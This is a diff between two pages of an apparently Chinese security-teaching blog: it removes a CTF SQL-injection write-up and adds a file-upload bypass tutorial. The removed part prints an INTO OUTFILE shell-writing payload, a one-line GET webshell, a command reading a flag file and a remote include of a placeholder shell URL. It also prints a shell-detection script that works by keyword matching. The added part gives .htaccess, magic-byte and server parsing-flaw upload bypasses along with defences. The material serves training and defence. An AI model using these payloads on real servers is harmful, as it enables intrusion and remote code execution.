@@ -6,19 +6,23 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>sql第三题write_up | Jason&#39;s Blog</title>
+  <title>文件上传 | Jason&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="##第三题Write Up&amp;emsp;这次的第三题主要是想练习一下班上同学以下三点知识：   代码审计 sql注入shell的写入 对一句话木马的理解   过滤文件filter.php的代码如下： &amp;lt;?php  function filter($input){     while(preg_match(&amp;apos;/(and|or|union|where|limit|group by|sel">
-<meta name="keywords" content="write_up">
+  <meta name="description" content="文件上传0x01.文件检测方法###1.客户端(javascript检测）   ###2.服务器端检测    MIME类型检测   文件后缀黑名单与白名单验证   目录验证 文件内容检测    二进制头(文件幻数检测)JFIF     FF D8 FF E0 00 10 4A 46 49 46 GIF89a47 49 46 38 39 61   PNG      89 50 4E 47  文件相关">
+<meta name="keywords" content="dawn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sql第三题write_up">
-<meta property="og:url" content="http://yoursite.com/2017/10/18/sql第三题write-up/index.html">
+<meta property="og:title" content="文件上传">
+<meta property="og:url" content="http://yoursite.com/2017/10/16/文件上传/index.html">
 <meta property="og:site_name" content="Jason&#39;s Blog">
-<meta property="og:description" content="##第三题Write Up&amp;emsp;这次的第三题主要是想练习一下班上同学以下三点知识：   代码审计 sql注入shell的写入 对一句话木马的理解   过滤文件filter.php的代码如下： &amp;lt;?php  function filter($input){     while(preg_match(&amp;apos;/(and|or|union|where|limit|group by|sel">
-<meta property="og:updated_time" content="2017-10-17T16:54:56.180Z">
+<meta property="og:description" content="文件上传0x01.文件检测方法###1.客户端(javascript检测）   ###2.服务器端检测    MIME类型检测   文件后缀黑名单与白名单验证   目录验证 文件内容检测    二进制头(文件幻数检测)JFIF     FF D8 FF E0 00 10 4A 46 49 46 GIF89a47 49 46 38 39 61   PNG      89 50 4E 47  文件相关">
+<meta property="og:image" content="http://oxwj17r3u.bkt.clouddn.com/blacklist.jpg">
+<meta property="og:image" content="http://oxwj17r3u.bkt.clouddn.com/cgi.fix_pathinfo.jpg">
+<meta property="og:image" content="http://oxwj17r3u.bkt.clouddn.com/how_to_attack.jpg">
+<meta property="og:updated_time" content="2017-10-17T17:01:42.799Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="sql第三题write_up">
-<meta name="twitter:description" content="##第三题Write Up&amp;emsp;这次的第三题主要是想练习一下班上同学以下三点知识：   代码审计 sql注入shell的写入 对一句话木马的理解   过滤文件filter.php的代码如下： &amp;lt;?php  function filter($input){     while(preg_match(&amp;apos;/(and|or|union|where|limit|group by|sel">
+<meta name="twitter:title" content="文件上传">
+<meta name="twitter:description" content="文件上传0x01.文件检测方法###1.客户端(javascript检测）   ###2.服务器端检测    MIME类型检测   文件后缀黑名单与白名单验证   目录验证 文件内容检测    二进制头(文件幻数检测)JFIF     FF D8 FF E0 00 10 4A 46 49 46 GIF89a47 49 46 38 39 61   PNG      89 50 4E 47  文件相关">
+<meta name="twitter:image" content="http://oxwj17r3u.bkt.clouddn.com/blacklist.jpg">
   
     <link rel="alternative" href="/atom.xml" title="Jason&#39;s Blog" type="application/atom+xml">
   
@@ -151,152 +155,135 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-sql第三题write-up" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-文件上传" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      sql第三题write_up
+      文件上传
     </h1>
   
 
         
-        <a href="/2017/10/18/sql第三题write-up/" class="archive-article-date">
-  	<time datetime="2017-10-17T16:54:06.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-10-18</time>
+        <a href="/2017/10/16/文件上传/" class="archive-article-date">
+  	<time datetime="2017-10-16T06:47:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-10-16</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>##第三题Write Up<br>&emsp;这次的第三题主要是想练习一下班上同学以下三点知识：</p>
-<blockquote>
+        <h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a><strong>文件上传</strong></h1><h2 id="0x01-文件检测方法"><a href="#0x01-文件检测方法" class="headerlink" title="0x01.文件检测方法"></a>0x01.文件检测方法</h2><p>###1.客户端(javascript检测）  </p>
+<p>###2.服务器端检测  </p>
 <ul>
-<li>代码审计</li>
-<li>sql注入shell的写入</li>
-<li>对一句话木马的理解</li>
+<li>MIME类型检测  </li>
+<li>文件后缀黑名单与白名单验证  </li>
+<li>目录验证</li>
+<li><p>文件内容检测  </p>
+<ul>
+<li>二进制头(文件幻数检测)<pre><code>JFIF     FF D8 FF E0 00 10 4A 46 49 46
+GIF89a47 49 46 38 39 61  
+PNG      89 50 4E 47
+</code></pre></li>
+<li><p>文件相关信息检测<br> 通常用的getimagesize()函数，只需要在幻数基础上加一些文件信息就行了，如下</p>
+<pre><code>GIF89a
+(...some binary data for image...)
+&lt;?php phpinfo(); ?&gt;
+(... skipping the rest of binary data ...)
+</code></pre></li>
+<li>文件加载检测</li>
+</ul>
+</li>
+</ul>
+<p>##0x02.攻击以及绕过方法</p>
+<p>###1.burp绕过前端JavaScript检测</p>
+<p>###2.burp修改http报头content-type类型</p>
+<p>###3.黑名单绕过以及白名单绕过</p>
+<ul>
+<li>文件名大小写  </li>
+<li><p>名单列表绕过</p>
+<blockquote>
+<p><img src="http://oxwj17r3u.bkt.clouddn.com/blacklist.jpg" alt="blacklist"><br><small>黑名单里没有asa或cer之类</small></p>
+</blockquote>
+</li>
+<li><p>特殊文件名绕过</p>
+<blockquote>
+<p>windows中test.asp.或test.asp_是不允许的，会自动去除点和空格等,linux/unix无这种特性。</p>
+</blockquote>
+</li>
+</ul>
+<ul>
+<li>0x00截断绕过</li>
+<li><p>.htaaccess文件攻击</p>
+<blockquote>
+<p>在PHP manual 中提到了下面一段话</p>
+<pre><code>move_uploaded_file section, there is a warning which states
+‘If the destination file already exists, it will be overwritten.’
+</code></pre><p>如果PHP 安全没配置好<br>就可以通过move_uploaded_file 函数把自己写的.htaccess 文件覆盖掉服务器上的<br>这样就能任意定义解析名单了</p>
+<pre><code>&lt;FilesMatch &quot;custom string&quot;&gt;
+SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt;
+</code></pre></blockquote>
+</li>
+<li><p>解析漏洞</p>
+<ul>
+<li><p>Apache解析漏洞</p>
+<ul>
+<li>Apache解析文件名顺序—-从右到左  <ul>
+<li>test.php.abc,解析文件名时从右到左，因.abc不是Apache能识别的文件后缀，所以会将其识别为php文件<br>//* test.jpg/emm.php也会识别为php文件<blockquote>
+<p>测试- 测试了下面这些集成环境，都以它们的最新版本来测试，应该能覆盖所有低版本<br>WampServer2.0 All Version (WampServer2.0i / Apache 2.2.11)&emsp;&emsp;&emsp;&emsp;[Success]<br>WampServer2.1 All Version (WampServer2.1e-x32 / Apache 2.2.17)&emsp;&ensp; [Success]<br>Wamp5 All Version (Wamp5_1.7.4 / Apache 2.2.6) &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&ensp;[Success]<br>AppServ 2.4 All Version (AppServ - 2.4.9 / Apache 2.0.59) &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;[Success]<br>AppServ 2.5 All Version (AppServ - 2.5.10 / Apache 2.2.8) &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;[Success]<br>AppServ 2.6 All Version (AppServ - 2.6.0 / Apache 2.2.8)&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;[Success]</p>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>IIS解析漏洞</p>
+<ul>
+<li>test.asp/abc</li>
+<li>test.asp;abc</li>
+<li>test.asp/abc.php<blockquote>
+<p>描述- IIS6.0 在解析asp 格式的时候有两个解析漏洞，一个是如果目录名包含”.asp”字符串，<br>那么这个目录下所有的文件都会按照asp 去解析。另一个是只要文件名中含有”.asp;”<br>会优先按asp 来解析<br>IIS7.0/7.5 是对php 解析时有一个类似于Nginx 的解析漏洞，对任意文件名只要在URL<br>后面追加上字符串”/任意文件名.php”就会按照php 的方式去解析(IIS6.0 没测试)<br>测试- 测试了下面这些集成环境，都以它们的最新版本来测试，应该能覆盖所有低版本<br>IIS6.0 (Win2003 SP2 + IIS6.0) [Success]<br>IIS7.0 (Win2008 R1 + IIS7.0) [Success]<br>IIS7.5 (Win2008 R2 + IIS7.5) [Success]</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li>Nginx解析漏洞<ul>
+<li>test.jpg/abc.php</li>
+<li>test.jpg%00.php</li>
+<li>test.jpg \abc.php<a href="CVE-2013-4547.md">^1</a><blockquote>
+<p>测试- 测试了下面这些环境<br>nginx 0.5.<em> [Success]<br>nginx 0.6.</em> [Success]<br>nginx 0.7 &lt;= 0.7.65 [Success]<br>nginx 0.8 &lt;= 0.8.37 [Success]</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li>漏洞原理<blockquote>
+<p>从漏洞原理来说总归有4 类web 应用程序解析漏洞</p>
+<ul>
+<li>Apache 的扩展名顺序解析漏洞<br>这个是Apache 自身的漏洞</li>
+<li>IIS 的asp 解析漏洞<br>这个是IIS 自身的漏洞</li>
+<li>Nginx 的%00 解析漏洞<br>这个是Nginx 自身的漏洞</li>
+<li>php-cgi 的默认配置漏洞<br>这类漏洞主要出现在IIS 和Nginx 这类以CGI 形式调用php 的web 应用程序<br>而Apache 通常是以module 的形式去调用php，所以很少出现这个漏洞  <pre><code>Bug #50852 FastCGI Responder&apos;s accept_path_info behavior needs to be optional
+地址: https://bugs.php.net/bug.php?id=50852&amp;edit=1
+</code></pre>这个漏洞由cgi.fix_pathinfo 的值造成的(这更应该是一个特性)<br><img src="http://oxwj17r3u.bkt.clouddn.com/cgi.fix_pathinfo.jpg" alt="cgi.fix_pathinfo"><br>默认值为1，也就是默认开启的</li>
 </ul>
 </blockquote>
-<p>过滤文件filter.php的代码如下：</p>
-<pre><code>&lt;?php
-
-function filter($input){
-    while(preg_match(&apos;/(and|or|union|where|limit|group by|select|hex|substr)/i&apos;,$input)){
-        $input=preg_replace(&apos;/(and|or|union|where|limit|group by|select|hex|substr)/i&apos;,&apos;&apos;,$input);
-    }
-    $array=array(&quot;*&quot;,&quot; &quot;,&quot;-&quot;,&quot;0x&quot;);
-    foreach($array as $str){
-        $input=str_replace($str,&quot;&quot;,$input);
-    }
-    return $input;
-}
-
-function filter_add($input){
-    $filter=preg_match(&apos;/(select.*into)|(limit [0-9]+,[0-9]+)/i&apos;,$input);
-    if($filter){
-        die(&quot;&lt;script&gt;alert(\&quot;emmmm...want to have a webshell?.\&quot;)&lt;/script&gt;&quot;);
-    }
-}
-
-function filter_admin($input){
-    preg_match(&quot;/^[_0-9a-z]{4,25}$/i&quot;,$input) or die(&quot;&lt;script&gt;alert(\&quot;Emmmmm...Your input is out of range or containing illegal parameter.\&quot;)&lt;/script&gt;&quot;);
-}
-?&gt;
-</code></pre><p>在filter函数中，敏感字符串和特殊符号分开进行了过滤，先检查敏感字符串再替换特殊符号为空，仔细思考会发现其存在逻辑漏洞，可以在敏感字符串中插入特殊字符绕过敏感字符串检测，过滤特殊字符后变成正常语句，空格过滤可以用%0a、反引号或者\n绕过，然后就可以进行正常的注入爆数据等，爆出管理员账号密码，密码是多次base64加密的密文，python脚本跑一遍就能得到明文。登陆取得一半flag。</p>
-<p>另一半需写入shell在上级目录读文件获得，在这里用正则过滤了“select into outfile”写shell的方式，但是正则写得不对……被大佬用\n和%0a绕过，这里本来是想让大家了解一下利用“terminated by”写shell的方式，在sqlmap目录下有个写shell的payload：</p>
-<pre><code>LIMIT 0,1 INTO OUTFILE &apos;%OUTFILE%&apos; LINES TERMINATED BY 0x%HEXSTRING%--
-</code></pre><p>与前者稍微不同的是，这个是在查询出数据后在数据中插入我们的一句话木马，因此写shell时前面需能正确查询一条或多条数据，具体可看这篇文章：<a href="http://www.cnblogs.com/qing123/p/6771858.html" target="_blank" rel="external">http://www.cnblogs.com/qing123/p/6771858.html</a></p>
-<p>在后台有一个python脚本会扫生成的shell文件并检测其中的敏感字符串<br>代码如下：</p>
-<pre><code>import os
-
-import re
-
-import time
-
-
-
-dir_list=[&quot;admin.php&quot;,&quot;index.php&quot;,&quot;sql&quot;,&quot;filter.php&quot;,&quot;filter.php.bak&quot;]
-
-dir_list2=[&quot;sql-con-1.php&quot;,&quot;sql-con-2.php&quot;,&quot;sql-con-3.php&quot;]
-
-str=&quot;emmmm,your shell is detected&quot;
-
-
-
-while(1):
-
-    dir=os.listdir(&quot;html/&quot;)
-
-    if len(dir) != len(dir_list):
-
-        for i in dir:
-
-            if i not in dir_list:
-
-                if os.path.isfile(&quot;html/%s&quot; % i):
-
-            dir_list.append(i)
-                    file=open(&quot;html/%s&quot; % i,&apos;r&apos;)
-
-                    try:
-
-                        content=file.read()
-
-                        content=content.lower()
-                        result=re.search(&quot;eval|assert|post|include|require|;&quot;,content)
-
-                        if result != None:
-
-                            print(&apos;shell found&apos;)
-
-                            file.close()
-
-                            file=open(&quot;html/%s&quot; % i,&apos;w&apos;)
-
-                            file.write(str)
-
-                    finally:
-
-                        file.close()
-
-            elif os.path.isdir(&quot;html/%s&quot; % i):
-
-                dir2=os.listdir(&quot;html/%s/&quot; % i)
-
-                for j in dir2:
-
-                    if j not in dir_list2:
-
-                        file = open(&quot;html/%s/%s&quot; % (i,j), &apos;r&apos;)
-
-                        try:
-
-                            content = file.read()
-
-                content=content.lower()
-                            result = re.search(&quot;eval|assert|include|post|require|;&quot;, content)
-
-                            if result != None:
-                print(&apos;shell found&apos;)
-
-                                file.close()
-
-                                file = open(&quot;html/%s/%s&quot; % (i,j), &apos;w&apos;)
-
-                                file.write(str)
-
-                        finally:
-
-                            file.close()
-
-    time.sleep(5)
-</code></pre><p>过滤了eval、assert、post，等关键词，以及分号，同学可以写入免杀且隐蔽的一句话，然后因为检测脚本会sleep 5s，因此也可以通过脚本或者burp在被遍历修改前访问到，想要同学们熟悉的是只有$_GET的shell：</p>
-<pre><code>&lt;?php $_GET[a]($_GET[b])?&gt;
-</code></pre><p>当a=assert时，后面可以执行一句话php代码，因此可以url传参a=assert&amp;b=system(‘cat ../flag.txt’)的方式读到flag，通过拿到第二题后wget或者第三题用load_file可以读到admin源码，可以发现我把密码加密函数文件放到了另外一台docker容器中，并通过远程包含的方式包含include进来：</p>
-<pre><code>include_once(&quot;http://172.17.0.3/level3/flag.php&quot;)
-</code></pre><p>可推测配置中allow_url_include=On，因此可以通过a=assert&amp;b=include(“<a href="http://xxxxx/shell.php" target="_blank" rel="external">http://xxxxx/shell.php</a>“)的方式拿到shell，这也是我在检测脚本中加入include和require检测的原因，避免直接包含了加密文件</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>###4.攻击思路与绕过图<br><img src="http://oxwj17r3u.bkt.clouddn.com/how_to_attack.jpg" alt="to_attack"></p>
+<p>###5.防御思路</p>
+<ol>
+<li>轻量级检测必然能绕过</li>
+<li>检测的重点放在文件内容检测,可以用检测脚本语言特征码的机制</li>
+<li>路径/扩展名检测一定要用白名单,并且注意路径的0x00 截断攻击(把php 更新至最新版本即可，已经修补了这个漏洞了)</li>
+<li>不能有本地文件包含漏洞</li>
+<li>随时注意更新web 应用软件,避免被解析漏洞攻击</li>
+</ol>
+<hr>
 
       
 
@@ -341,7 +328,7 @@ while(1):
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">write_up</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">dawn</a>
         		</li>
       		
 		</ul>
@@ -397,7 +384,7 @@ while(1):
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2017/10/18/sql第三题write-up/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2017/10/16/文件上传/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -411,9 +398,18 @@ while(1):
   
 <nav id="article-nav">
   
+    <a href="/2017/10/18/sql第三题write-up/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          sql第三题write_up
+        
+      </div>
+    </a>
   
-    <a href="/2017/10/16/文件上传/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">文件上传</div>
+  
+    <a href="/2017/10/16/CVE-2013-4547/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">CVE-2013-4547</div>
       <i class="icon-circle-right"></i>
     </a>
   
